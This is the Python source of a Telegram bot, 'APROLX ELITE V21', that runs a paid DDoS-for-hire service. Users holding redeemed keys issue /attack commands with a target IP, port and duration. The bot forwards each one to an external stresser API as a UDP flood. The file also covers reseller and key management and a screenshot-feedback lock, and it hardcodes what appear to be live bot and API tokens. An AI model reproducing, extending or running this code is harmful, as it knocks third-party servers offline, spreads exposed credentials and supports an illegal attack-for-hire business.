#!/usr/bin/env python3
"""
APROLX ELITE V21 - ULTIMATE TELEGRAM ATTACK BOT
Optimized for Railway / Termux hosting.
API: stresser.works
"""

import telebot
from telebot.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import random
import string
import re
import sys
import json
from datetime import datetime, timedelta
import time
import requests

sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

BOT_START_TIME = datetime.now()

# ============= CONFIGURATION =============
BOT_TOKEN = "87xRr9sdHIp3pTo7cDluuBtjj6z9omYHc"
BOT_OWNER = 8605900206

# Stresser.works API config
DEFAULT_API_URL = "https://stresser.works/api/start"
DEFAULT_API_TOKEN = "c9b483cfafaa99e8f8800d197df24ccc73b9498398b5301c890cc12cb5e39563"
DEFAULT_API_METHOD = "UDP-BIG"
DEFAULT_API_GEOLOCATION = "ALL"

# ============= FILE STORAGE =============
DATA_FILE = "bot_data_v21.json"

def load_data():
    default_data = {
        "users": {},
        "keys": {},
        "resellers": {},
        "admins": {str(BOT_OWNER): {"added_at": datetime.now().isoformat()}},
        "approved_groups": {},
        "attack_logs": [],
        "admin_logs": [],
        "banned_users": {},
        "feedbacks": [],
        "settings": {
            "max_attack_time": 300,
            "user_cooldown": 30,
            "concurrent_limit": 4,
            "maintenance_mode": False,
            "maintenance_msg": "🔧 𝐀𝐏𝐑𝐎𝐋𝐗 𝐄𝐋𝐈𝐓𝐄 is under maintenance. Please try again later.",
            "port_protection": True,
            "feedback_system": True,
            "feedback_channel": "-1008605900206",
            "api_url": DEFAULT_API_URL,
            "api_token": DEFAULT_API_TOKEN,
            "api_method": DEFAULT_API_METHOD,
            "api_geolocation": DEFAULT_API_GEOLOCATION,
            "blocked_ports": [],
            "blocked_ips": []
        }
    }
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                d = json.load(f)
                if isinstance(d, dict):
                    for key, val in default_data.items():
                        d.setdefault(key, val)
                    # ensure new keys exist inside settings
                    for sk, sv in default_data["settings"].items():
                        d["settings"].setdefault(sk, sv)
                    return d
        except Exception as e:
            print(f"Error loading {DATA_FILE}: {e}. Resetting to defaults.")
    return default_data

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2, default=str)

data = load_data()
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ============= HELPER FUNCTIONS =============
def is_owner(user_id):
    return user_id == BOT_OWNER or str(user_id) in data["admins"]

def is_master_owner(user_id):
    return user_id == BOT_OWNER

def is_reseller(user_id):
    reseller = data["resellers"].get(str(user_id))
    return reseller is not None and not reseller.get('blocked', False)

def is_banned(user_id):
    return str(user_id) in data["banned_users"]

def get_setting(key, default):
    return data["settings"].get(key, default)

def set_setting(key, value):
    data["settings"][key] = value
    save_data(data)

def get_max_attack_time():
    return get_setting('max_attack_time', 300)

def get_user_cooldown_setting():
    return get_setting('user_cooldown', 30)

def is_maintenance():
    return get_setting('maintenance_mode', False)

def get_maintenance_msg():
    return get_setting('maintenance_msg', '🔧 Bot maintenance mein hai.')

def log_admin_action(admin_id, action_desc):
    data["admin_logs"].append({
        'admin_id': admin_id,
        'action': action_desc,
        'timestamp': datetime.now().isoformat()
    })
    save_data(data)

# ============= COOLDOWN & ATTACK TRACKING =============
user_cooldown = {}
attack_lock = threading.Lock()
active_attacks = {}
user_state = {}

def get_user_cooldown_remaining(user_id):
    if user_id in user_cooldown:
        remaining = user_cooldown[user_id] - time.time()
        if remaining > 0:
            return int(remaining)
        else:
            del user_cooldown[user_id]
    return 0

def set_user_cooldown(user_id):
    cooldown_sec = get_user_cooldown_setting()
    if cooldown_sec > 0:
        user_cooldown[user_id] = time.time() + cooldown_sec

def has_valid_key(user_id):
    if is_owner(user_id) or is_reseller(user_id):
        return True
    user = data["users"].get(str(user_id))
    if not user or not user.get('key_expiry'):
        return False
    try:
        expiry = datetime.fromisoformat(user['key_expiry'])
        if datetime.now() > expiry:
            return False
        return True
    except:
        return False

def get_time_remaining_full(user_id):
    if is_owner(user_id):
        return "Unlimited (Owner)"
    user = data["users"].get(str(user_id))
    if not user or not user.get('key_expiry'):
        return "Expired"
    try:
        remaining = datetime.fromisoformat(user['key_expiry']) - datetime.now()
        if remaining.total_seconds() <= 0:
            return "Expired"
        days = remaining.days
        hours, r2 = divmod(remaining.seconds, 3600)
        minutes, _ = divmod(r2, 60)
        return f"{days}d {hours}h {minutes}m"
    except:
        return "Error"

def is_attack_running():
    with attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                del active_attacks[attack_id]
        return len(active_attacks) > 0

def get_active_attack_info():
    with attack_lock:
        now = datetime.now()
        for attack_id, attack in active_attacks.items():
            if attack['end_time'] > now:
                remaining = int((attack['end_time'] - now).total_seconds())
                return {
                    'running': True,
                    'username': attack.get('username', 'Unknown'),
                    'target': attack.get('target'),
                    'port': attack.get('port'),
                    'remaining': remaining,
                }
        return {'running': False}

def log_attack(user_id, username, target, port, duration):
    data["attack_logs"].append({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now().isoformat()
    })
    if str(user_id) in data["users"]:
        data["users"][str(user_id)]["total_attacks"] = data["users"][str(user_id)].get("total_attacks", 0) + 1
    save_data(data)

def get_ist_time():
    return (datetime.now() + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')

# ============= API DISPATCHER =============
def send_attack_to_api(ip, port, dur):
    """Send attack request to stresser.works API. Returns (success, msg)."""
    try:
        api_url = get_setting("api_url", DEFAULT_API_URL)
        api_token = get_setting("api_token", DEFAULT_API_TOKEN)
        api_method = get_setting("api_method", DEFAULT_API_METHOD)
        api_geo = get_setting("api_geolocation", DEFAULT_API_GEOLOCATION)

        req_url = (
            f"{api_url}?token={api_token}"
            f"&host={ip}"
            f"&port={port}"
            f"&time={dur}"
            f"&method={api_method}"
            f"&geolocation={api_geo}"
        )

        print(f"[API] Sending: {req_url}")
        resp = requests.get(req_url, timeout=15)
        print(f"[API] HTTP {resp.status_code} | Body: {resp.text[:300]}")

        if resp.status_code == 200:
            return True, resp.text
        else:
            return False, f"HTTP {resp.status_code}: {resp.text[:200]}"
    except Exception as e:
        print(f"[API] Error: {e}")
        return False, str(e)

# ============= KEYBOARDS =============
def get_main_keyboard(user_id):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    if is_owner(user_id):
        markup.row("🔥 ATTACK", "📊 STATUS")
        markup.row("👤 PROFILE", "👑 OWNER PANEL")
        return markup
    if is_reseller(user_id):
        markup.row("🔥 ATTACK", "📊 STATUS")
        markup.row("🔑 REDEEM KEY", "👤 PROFILE")
        markup.row("💼 RESELLER PANEL")
        return markup
    if has_valid_key(user_id):
        markup.row("🔥 ATTACK", "📊 STATUS")
        markup.row("🔑 REDEEM KEY", "👤 PROFILE")
        return markup
    markup.row("🔑 REDEEM KEY", "👤 PROFILE")
    return markup

def get_owner_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🔑 GEN KEY", "🗑️ DELETE KEY")
    markup.row("👥 USERS LIST", "➕ ADD RESELLER")
    markup.row("📊 SERVER STATS", "📢 BROADCAST")
    markup.row("⚙️ SETTINGS", "❌ CLOSE PANEL")
    return markup

def get_back_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🏠 MAIN MENU")
    return markup

# ============= BOT COMMANDS =============

@bot.message_handler(commands=['start', 'help'])
def cmd_start(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot.")
        return
    username = message.from_user.username or message.from_user.first_name
    
    text = f"""🔥 𝐀𝐏𝐑𝐎𝐋𝐗 𝐄𝐋𝐈𝐓𝐄 𝐕𝟐𝟏 🔥
─────────────────────
Welcome, @{username}! 👤
Your gateway to high-performance attack execution.

• 🎯 Method: {get_setting('api_method', 'UDP-BIG')}
• ⚡ Status: ONLINE
• ⏰ Time Remaining: {get_time_remaining_full(user_id)}
─────────────────────
Use the buttons below or send commands to interact."""
    bot.send_message(message.chat.id, text, reply_markup=get_main_keyboard(user_id))

@bot.message_handler(commands=['attack'])
def cmd_attack_command(message):
    user_id = message.from_user.id
    if is_banned(user_id): return
    chat_id = message.chat.id
    
    # Check group approval if in group
    if message.chat.type in ['group', 'supergroup']:
        group_id = str(message.chat.id)
        if group_id not in data["approved_groups"]:
            bot.reply_to(message, "⚠️ This group is not approved for attacks! Contact owner to use /approve.")
            return
    
    if not is_owner(user_id) and not has_valid_key(user_id):
        bot.reply_to(message, "⚠️ You don't have an active key or subscription! Please redeem a key.")
        return
        
    parts = message.text.split()[1:]
    if len(parts) != 3:
        bot.reply_to(message, "❌ Usage: /attack <ip> <port> <time>\nExample: /attack 52.140.18.56 11398 60")
        return
        
    ip, port_str, dur_str = parts[0], parts[1], parts[2]
    
    # Validation
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        bot.reply_to(message, "❌ Invalid IP address format!")
        return
        
    try:
        port = int(port_str)
        dur = int(dur_str)
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ Invalid port (1-65535)!")
            return
        if dur < 1:
            bot.reply_to(message, "❌ Duration must be at least 1 second!")
            return
        if dur > get_max_attack_time() and not is_owner(user_id):
            bot.reply_to(message, f"❌ Max attack time is {get_max_attack_time()}s!")
            return
    except:
        bot.reply_to(message, "❌ Invalid port or duration number!")
        return

    # Check feedback lock
    user_rec = data["users"].get(str(user_id), {})
    if user_rec.get("pending_feedback") and not is_owner(user_id) and get_setting("feedback_system", True):
        bot.reply_to(message, "⚠️ 𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃!\n\nPlease send a screenshot/photo of your previous attack result to unlock your next attack.")
        return

    # Cooldown check
    cd = get_user_cooldown_remaining(user_id)
    if cd > 0 and not is_owner(user_id):
        bot.reply_to(message, f"⏸️ Cooldown active! Please wait {cd} seconds.")
        return

    if is_attack_running():
        info = get_active_attack_info()
        bot.reply_to(message, f"❌ An attack is already in progress!\nTarget: {info['target']}:{info['port']} ({info['remaining']}s left)")
        return

    set_user_cooldown(user_id)
    start_ist = get_ist_time()
    display_name = message.from_user.username or f"User_{user_id}"
    method = get_setting("api_method", "UDP-BIG")

    # ===== Send to API first =====
    ok, api_msg = send_attack_to_api(ip, port, dur)

    if not ok:
        bot.reply_to(
            message,
            f"❌ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐀𝐈𝐋𝐄𝐃\n\n"
            f"API Response: <code>{api_msg[:300]}</code>\n\n"
            f"Possible reasons:\n• Token expired/invalid\n• Balance khatam\n• Target already under attack\n• Method galat"
        )
        return

    bot.reply_to(
        message,
        f"💀 𝐀𝐏𝐑𝐎𝐋𝐗 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 💀\n\n"
        f"👤 User: @{display_name}\n"
        f"🎯 Target: {ip}:{port}\n"
        f"⏱️ Duration: {dur}s\n"
        f"🚀 Method: {method}\n"
        f"📅 Started: {start_ist} IST"
    )

    log_attack(user_id, display_name, ip, port, dur)
    if not is_owner(user_id) and get_setting("feedback_system", True):
        data["users"].setdefault(str(user_id), {})["pending_feedback"] = True
        save_data(data)

    attack_id = f"{user_id}_{datetime.now().timestamp()}"
    with attack_lock:
        active_attacks[attack_id] = {
            'target': ip, 'port': port, 'duration': dur,
            'user_id': user_id, 'username': display_name,
            'end_time': datetime.now() + timedelta(seconds=dur)
        }

    def finish_attack():
        time.sleep(dur)
        with attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
        try:
            bot.send_message(chat_id, f"✅ 𝐀𝐏𝐑𝐎𝐋𝐗 𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃 ✅\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {dur}s\n\n📸 Please send a screenshot/photo of the attack result as feedback to unlock your next attack!")
        except:
            pass

    threading.Thread(target=finish_attack, daemon=True).start()

# ============= OWNER / ADMIN COMMANDS =============

@bot.message_handler(commands=['approve'])
def cmd_approve_group(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) < 5:
        bot.reply_to(message, "⚠️ Usage: /approve <group_id> <conc> <time> <cd>")
        return
    gid, conc, dur, cd = parts[1], parts[2], parts[3], parts[4]
    data["approved_groups"][gid] = {"concurrent": conc, "time": dur, "cooldown": cd, "approved_at": datetime.now().isoformat()}
    save_data(data)
    bot.reply_to(message, f"✅ Group {gid} approved successfully!")

@bot.message_handler(commands=['disapprove'])
def cmd_disapprove_group(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /disapprove <group_id>")
        return
    gid = parts[1]
    if gid in data["approved_groups"]:
        del data["approved_groups"][gid]
        save_data(data)
        bot.reply_to(message, f"✅ Group {gid} removed from approved list.")
    else:
        bot.reply_to(message, f"❌ Group {gid} not found in approved list.")

@bot.message_handler(commands=['approved_groups'])
def cmd_list_approved_groups(message):
    if not is_owner(message.from_user.id): return
    if not data["approved_groups"]:
        bot.reply_to(message, "📂 No approved groups found.")
        return
    text = "📋 𝐀𝐏𝐑𝐎𝐋𝐗 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐆𝐑𝐎𝐔𝐏𝐒:\n─────────────────────\n"
    for gid, info in data["approved_groups"].items():
        text += f"• ID: <code>{gid}</code> | Conc: {info['concurrent']} | Time: {info['time']}s\n"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['setapi'])
def cmd_set_api(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(
            message,
            "⚠️ Usage: /setapi <url> <token> [method] [geolocation]\n"
            "Example: /setapi https://stresser.works/api/start YOUR_TOKEN UDP-BIG ALL"
        )
        return
    url = parts[1]
    token = parts[2]
    method = parts[3] if len(parts) > 3 else "UDP-BIG"
    geo = parts[4] if len(parts) > 4 else "ALL"
    set_setting("api_url", url)
    set_setting("api_token", token)
    set_setting("api_method", method)
    set_setting("api_geolocation", geo)
    bot.reply_to(
        message,
        f"✅ API Updated Successfully!\n\n"
        f"📡 URL: {url}\n"
        f"🔑 Token: {token}\n"
        f"⚙️ Method: {method}\n"
        f"🌍 Geo: {geo}"
    )

@bot.message_handler(commands=['setfeedbackchannel'])
def cmd_set_feedback_channel(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /setfeedbackchannel <channel_id>")
        return
    ch = parts[1]
    set_setting("feedback_channel", ch)
    bot.reply_to(message, f"✅ Feedback channel set to: {ch}")

@bot.message_handler(commands=['testapi'])
def cmd_test_api(message):
    if not is_owner(message.from_user.id): return
    ok, msg = send_attack_to_api("1.1.1.1", 80, 5)
    if ok:
        bot.reply_to(message, f"✅ API WORKING\n\nResponse: <code>{msg[:300]}</code>")
    else:
        bot.reply_to(message, f"❌ API FAILED\n\nResponse: <code>{msg[:300]}</code>")

@bot.message_handler(commands=['ban'])
def cmd_ban(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /ban <user_id>")
        return
    uid = parts[1]
    data["banned_users"][uid] = datetime.now().isoformat()
    save_data(data)
    bot.reply_to(message, f"✅ User {uid} banned.")

@bot.message_handler(commands=['unban'])
def cmd_unban(message):
    if not is_owner(message.from_user.id): return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /unban <user_id>")
        return
    uid = parts[1]
    if uid in data["banned_users"]:
        del data["banned_users"][uid]
        save_data(data)
        bot.reply_to(message, f"✅ User {uid} unbanned.")
    else:
        bot.reply_to(message, f"❌ User {uid} not banned.")

# ============= FEEDBACK PHOTO HANDLER =============
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    user_rec = data["users"].get(str(user_id))
    
    if user_rec and user_rec.get("pending_feedback"):
        user_rec["pending_feedback"] = False
        save_data(data)
        
        username = message.from_user.username or message.from_user.first_name
        bot.reply_to(message, "✅ 𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃!\n\nYour next attack is now unlocked! 🔥")
        
        ch = get_setting("feedback_channel", None)
        if ch:
            try:
                caption = f"🔥 𝐀𝐏𝐑𝐎𝐋𝐗 𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 🔥\n👤 User: @{username}\n🆔 ID: {user_id}\n✅ Status: UNLOCKED"
                bot.send_photo(ch, message.photo[-1].file_id, caption=caption)
            except:
                pass
    else:
        bot.reply_to(message, "📸 Nice screenshot! Use /attack to launch an attack.")

# ============= MAIN LOOP =============
print("""
╔══════════════════════════════════════════════════════════════╗
║   🔥 APROLX ELITE V21 IS LIVE NOW                            ║
║   Railway / Termux Hosting Optimized                         ║
╚══════════════════════════════════════════════════════════════╝""")
print(f"👑 Master Owner: {BOT_OWNER}")
print(f"📊 Users: {len(data['users'])}")
print(f"🔑 Keys: {len(data['keys'])}")
print(f"📡 API: {get_setting('api_url')}")
print("✅ Bot is running and polling...")

while True:
    try:
        bot.remove_webhook()
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        print(f"Polling Error: {e}")
        time.sleep(3)
